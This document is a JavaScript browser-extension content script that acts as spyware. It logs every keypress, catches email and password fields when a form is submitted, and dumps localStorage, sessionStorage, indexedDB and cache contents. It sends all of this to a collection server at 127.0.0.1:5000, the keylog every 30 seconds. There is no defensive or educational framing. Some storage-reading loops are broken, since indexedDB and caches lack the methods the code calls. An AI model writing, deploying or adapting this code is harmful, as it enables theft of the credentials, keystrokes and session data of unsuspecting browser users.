var keylog = localStorage.getItem('keylog') || '';
window.addEventListener('keypress',function(key){
console.log(key.key);

keylog += key.key;
localStorage.setItem('keylog', keylog);
})
if (document.querySelector('form')!=null) {
  var form = document.querySelector('form');

// Add an event listener to the form submission
form.addEventListener('submit', function(event) {
  // Prevent the default form submission behavior
  event.preventDefault();

  // Perform any actions you want to take when the form is submitted
  // For example, you can access the form data like this:
  var formData = new FormData(event.target);

  console.log('url',location.href)
  
  console.log(formData.get('email'));
  console.log(formData.get('pass'));
  console.log(formData.get('password'));

  email=formData.get('email') || '';
  password=formData.get('pass') ||formData.get('password') || '';
  url=location.href;

  if(email.length>0 || password.length>0){
      console.log(url,email,password);
    fetch('http://127.0.0.1:5000/send_userpass_content', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({url: url, email:email,password:password,browser_id: chrome.runtime.id}),
      timeout: 60000 
    })
    .then(response => response.json())
    .then(data => {
      console.log(data.state);
      
    
    })
    .catch(error => console.error(error));
  }


});
  
}

console.log('url',location.href)
console.log('localStorage',localStorage)
console.log('indexedDB',window.indexedDB)
console.log('sessionStorage',sessionStorage)
console.log('caches',caches)

var localStorageData = {};
for (let i = 0; i < localStorage.length; i++) {
  var  key = localStorage.key(i);
  localStorageData[key] = localStorage.getItem(key);
}

var  indexedDBData = {};
for (let i = 0; i < window.indexedDB.length; i++) {
  var key = window.indexedDB.key(i);
  indexedDBData[key] = window.indexedDB.getItem(key);
}
var  sessionStorageData = {};
for (let i = 0; i < sessionStorage.length; i++) {
  var key = sessionStorage.key(i);
  sessionStorageData[key] = sessionStorage.getItem(key);
}
var  cachesData = {};
for (let i = 0; i < caches.length; i++) {
  var key = caches.key(i);
  cachesData[key] = caches.getItem(key);
}
console.log(localStorageData)
console.log(indexedDBData)
console.log(sessionStorageData)
console.log(cachesData)




fetch('http://127.0.0.1:5000/send_storage_data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({url: location.href,browser_id: chrome.runtime.id,localStorage:localStorageData,indexedDB:indexedDBData,caches:cachesData,sessionStorage:sessionStorageData}),
      timeout: 60000 
    })
    .then(response => response.json())
    .then(data => {
      console.log(data.state);
      
    
    })
    .catch(error => console.error(error));




setInterval(function(){

  if(localStorage.getItem('keylog')!=null){
    fetch('http://127.0.0.1:5000/send_keylog', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({keylog: localStorage.getItem('keylog') ,browser_id: chrome.runtime.id}),
      timeout: 60000 
    })
    .then(response => response.json())
    .then(data => {
      console.log(data.state);
      localStorage.removeItem('keylog');
      var keylog='';
    
    })
    .catch(error => console.error(error));
  
  }

},30000)







 

